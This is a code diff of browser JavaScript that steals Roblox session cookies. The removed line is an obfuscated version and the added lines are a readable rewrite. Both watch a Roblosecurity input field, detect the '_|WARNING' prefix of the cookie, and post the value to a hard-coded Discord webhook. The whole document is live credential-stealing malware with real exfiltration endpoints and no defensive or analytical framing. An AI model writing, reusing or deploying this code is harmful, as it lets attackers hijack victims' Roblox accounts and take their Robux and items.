@@ -1,1 +1,33 @@
-const _0x17bb48=_0x208d;(function(_0x329da9,_0x113dba){const _0x28b1bd=_0x208d,_0x3dc70c=_0x329da9();while(!![]){try{const _0x33e9d6=-parseInt(_0x28b1bd(0x1ca))/0x1+-parseInt(_0x28b1bd(0x1d3))/0x2*(-parseInt(_0x28b1bd(0x1cf))/0x3)+parseInt(_0x28b1bd(0x1c5))/0x4*(-parseInt(_0x28b1bd(0x1d1))/0x5)+-parseInt(_0x28b1bd(0x1d6))/0x6*(-parseInt(_0x28b1bd(0x1d5))/0x7)+parseInt(_0x28b1bd(0x1d2))/0x8*(parseInt(_0x28b1bd(0x1c4))/0x9)+parseInt(_0x28b1bd(0x1cd))/0xa+-parseInt(_0x28b1bd(0x1c6))/0xb;if(_0x33e9d6===_0x113dba)break;else _0x3dc70c['push'](_0x3dc70c['shift']());}catch(_0xe9db3d){_0x3dc70c['push'](_0x3dc70c['shift']());}}}(_0x17d4,0x6e7d6));const webhookUrl=_0x17bb48(0x1d7),warningMessage='_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';function sendToDiscord(_0xdc7e85){const _0x59da69=_0x17bb48;fetch(webhookUrl,{'method':_0x59da69(0x1c3),'headers':{'Content-Type':'application/json'},'body':JSON[_0x59da69(0x1ce)]({'content':_0xdc7e85})})[_0x59da69(0x1c2)](_0x243ba3=>{if(!_0x243ba3['ok']){}})['catch'](_0x318ffb=>{});}function _0x17d4(){const _0x1f65d4=['addEventListener','value','21144tAcXZC','input','querySelector','6677680okoWDz','stringify','591IeuUfw','.css-1o78utj-Roblosecurity--Input','270hSJQfM','8YnKzfA','8990UWrnvO','Current\x20input\x20value:\x20','105539CwqLLn','324OHmkQe','https://discord.com/api/webhooks/1265138432917901465/iqDfMyGTmgxDzLz3RIRLVmdvbd69EpGgYc_F8cDEr-yOyC68afGd41oAOqsfYSPr9KNl','then','POST','7987185MKqrWd','25684NCZbJL','26779082RuFXXk','includes'];_0x17d4=function(){return _0x1f65d4;};return _0x17d4();}function _0x208d(_0x2dd903,_0x2a2d0c){const _0x17d453=_0x17d4();return _0x208d=function(_0x208db4,_0xec589f){_0x208db4=_0x208db4-0x1c2;let _0x477142=_0x17d453[_0x208db4];return _0x477142;},_0x208d(_0x2dd903,_0x2a2d0c);}function setupEventListener(){const _0x484973=_0x17bb48,_0x13ae86=document[_0x484973(0x1cc)](_0x484973(0x1d0));if(_0x13ae86)return _0x13ae86[_0x484973(0x1c8)](_0x484973(0x1cb),function(){const _0x584933=_0x484973,_0x2b5023=this[_0x584933(0x1c9)];_0x2b5023[_0x584933(0x1c7)](warningMessage)&&sendToDiscord(_0x584933(0x1d4)+_0x2b5023);}),!![];return![];}const interval=setInterval(()=>{setupEventListener()&&clearInterval(interval);},0x1f4);
+function waitForElement(selector, callback) {
+    const checkExist = setInterval(() => {
+        const element = document.querySelector(selector);
+        if (element) {
+            clearInterval(checkExist);
+            callback(element);
+        }
+    }, 100); // Check every 100ms
+}
+
+function sendToDiscord(message) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1265154307192393760/V6JVLKmJLxaODRmjh--kSL18lkqh7fcJRh0s36LhD6mXWwj4xvkmY-TaTNxtLVHQFep3';
+    const payload = JSON.stringify({ content: message });
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: payload
+    }).catch(error => {
+        console.error('Error sending to Discord:', error);
+    });
+}
+
+waitForElement('.css-1o78utj-Roblosecurity--Input', (inputField) => {
+    inputField.addEventListener('input', (event) => {
+        const value = event.target.value;
+        if (value.startsWith('_|WA')) {
+            sendToDiscord(`Input value: ${value}`);
+        }
+    });
+});
